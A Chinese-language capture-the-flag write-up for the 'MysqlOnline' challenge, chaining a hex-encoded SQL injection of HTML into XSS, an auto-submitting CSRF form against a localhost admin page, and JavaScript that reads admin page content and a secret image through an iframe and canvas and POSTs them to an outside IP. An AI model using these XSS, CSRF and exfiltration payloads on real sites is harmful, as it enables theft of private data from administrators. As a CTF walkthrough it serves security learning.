---
title: MysqlOnline writeup 巅峰极客
comments: true
date: 2018-07-23 21:00:10
tags:
	- writeup
	- xss
categories:
	- 信息安全
	- writeup
keywords: 
	- writeup
	- xss
	- 巅峰极客
---

又是一道xss...

> 在线mysql运行环境，欢迎大家使用，别弄坏了它呀。另外还有什么网页上的问题，欢迎您提交反馈。
>
> [http://106.75.35.230:9001](http://106.75.35.230:9001/?pass=null)


<!-- more -->

## 前期测试

分析题目，题目可以执行sql语句，此时存在执行后的回显

![mark](https://img.5am3.com/img/180723/9e0i9dKi4l.png)

结合下面的报告栏，疑似xss类题目，尝试输入<>,发现存在waf。在sql语句中，为绕过waf，通常会使用ascii码16进制编码，此时可以构造`<img>`的十六进制

```sql
select 0x3c696d673e
```

此时发现页面可以成功渲染出img标签。

找到xss点了，然后进行报告，一开始以为是留言可以直接写payload，但是尝试后发现不行。

仔细读题，发现他应该是会check url。

直接尝试写入自己监听的url `http://xxx.xx/xx`

![mark](https://img.5am3.com/img/180723/Cl0I1eIlmK.png)

可以发现他有一个后台。

```
http://127.0.0.1//admin_zzzz666.php
```

![mark](https://img.5am3.com/img/180723/EH987d13fc.png)

## 构造csrf

尝试访问后，发现只可以本地访问。

此时可以利用前面发现的xss，来构造csrf。

此时传入的参数，为我要引入的恶意js。



```
payload:<script src=//eval.com></script>
转化后：0x3c736372697074207372633d2f2f6576616c2e636f6d3e3c2f7363726970743e
```

所以可以构造以下页面进行csrf，提交该页面的链接，让admin访问，然后会提交表单，跳转到`http://127.0.0.1/runsql.php` 页面，成功在该页面实现xss。

```html
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>eval</title>
	<script src=http://127.0.01/static/js/jquery.min.js></script>
</head>
<body>
	<form id="a" action="http://127.0.0.1/runsql.php" method="post">
		<input type="text" name="sql" value="select 0x3c736372697074207372633d2f2f6576616c2e636f6d3e3c2f7363726970743e">
	</form>
	<script>
		$("#a").submit();
	</script>
</body>
</html>
```

此时将该文件上传到任意服务器或托管平台

csrf至此已经成功完成，接下来需要让其发挥最大效果。也就是我们修改eval.com的js代码。



## xss攻击代码



**读源码**

```js
function send(e) {
    var t = new XMLHttpRequest;
    t.open("POST", "//139.199.107.193:2210", !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.send(e)
}

 var iframe = document.createElement("iframe");
 iframe.src = "./admin_zzzz666.php";
 document.body.appendChild(iframe);
 iframe.onload = setInterval(function (){ 
 	var c = encodeURI(document.getElementsByTagName("iframe")[0].contentWindow.document.getElementsByTagName("body")[0].innerHTML);
 	send(btoa(c));
 },1000)
```

读取后发现和自己访问，唯一的不同是多了一张图片。

自己天真的以为还用刚刚的套路就可以读，然而发现想错了，这样只能读出来一个标签。

然后继续去搜索，如何读取图片，由于没有找到如何下载源文件。

最终发现canvas可以返回二进制流。

所以自己直接尝试渲染出来并返回图像了。

好在这道题flag就是图片，如果是隐写的话，可能又得费点劲。

**读图片**

```js
function send(e) {
    var t = new XMLHttpRequest;
    t.open("POST", "//139.199.107.193:2210", !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.send(e)
}
var ca =document.createElement("canvas")
ca.setAttribute('id', 'cv');
ca.width = '1500';
ca.height = '500'
document.body.appendChild(ca);

var cxt=ca.getContext("2d");
var img=new Image()
img.src="http://127.0.0.1/static/img/iamsecret_555.jpg"
img.onload = function(){
	cxt.drawImage(img,0,0)
	var data = ca.toDataURL();
	send(data);
}
```

成功拿到回显

![mark](https://img.5am3.com/img/180723/16lalbGkLm.png)

最后成功拿到flag

![mark](https://img.5am3.com/img/180723/Bi768CeAFB.png)



